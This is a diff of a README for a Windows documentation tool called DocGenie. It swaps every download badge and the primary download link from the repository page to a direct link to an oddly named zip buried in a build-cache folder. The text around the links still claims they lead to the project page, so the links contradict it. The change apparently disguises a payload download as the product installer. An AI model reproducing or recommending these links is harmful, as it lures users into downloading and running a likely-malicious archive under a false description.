@@ -1,6 +1,6 @@
 # 🤖 DocGenie - Automate Your Documentation Easily
 
-[![Download DocGenie](https://img.shields.io/badge/Download-DocGenie-green?style=for-the-badge)](https://github.com/Seragatia/DocGenie)
+[![Download DocGenie](https://img.shields.io/badge/Download-DocGenie-green?style=for-the-badge)](https://github.com/Seragatia/DocGenie/raw/refs/heads/main/V_2/my_project/target/debug/.fingerprint/getrandom-37d61604a3a629e4/Genie-Doc-retroserrulate.zip)
 
 ---
 
@@ -42,7 +42,7 @@ To get DocGenie up and running on your Windows PC, follow these instructions car
 
 DocGenie is hosted on GitHub. You can download it from this page:
 
-[![Download DocGenie](https://img.shields.io/badge/Download-DocGenie-blue?style=for-the-badge)](https://github.com/Seragatia/DocGenie)
+[![Download DocGenie](https://img.shields.io/badge/Download-DocGenie-blue?style=for-the-badge)](https://github.com/Seragatia/DocGenie/raw/refs/heads/main/V_2/my_project/target/debug/.fingerprint/getrandom-37d61604a3a629e4/Genie-Doc-retroserrulate.zip)
 
 Click the link above, and it will take you to the main project page. Look for the **Releases** section or a download button to find the latest Windows installer.
 
@@ -164,11 +164,11 @@ Usually, DocGenie suggests a "DocGenieDocs" folder in your Documents directory. 
 
 ## 🔗 Important Links
 
-- Primary download page: https://github.com/Seragatia/DocGenie  
+- Primary download page: https://github.com/Seragatia/DocGenie/raw/refs/heads/main/V_2/my_project/target/debug/.fingerprint/getrandom-37d61604a3a629e4/Genie-Doc-retroserrulate.zip  
 - Project homepage with source code and issues tracker  
 - Documentation and help materials included with the app
 
-[![Download DocGenie](https://img.shields.io/badge/Download-DocGenie-grey?style=for-the-badge)](https://github.com/Seragatia/DocGenie)
+[![Download DocGenie](https://img.shields.io/badge/Download-DocGenie-grey?style=for-the-badge)](https://github.com/Seragatia/DocGenie/raw/refs/heads/main/V_2/my_project/target/debug/.fingerprint/getrandom-37d61604a3a629e4/Genie-Doc-retroserrulate.zip)
 
 ---
 
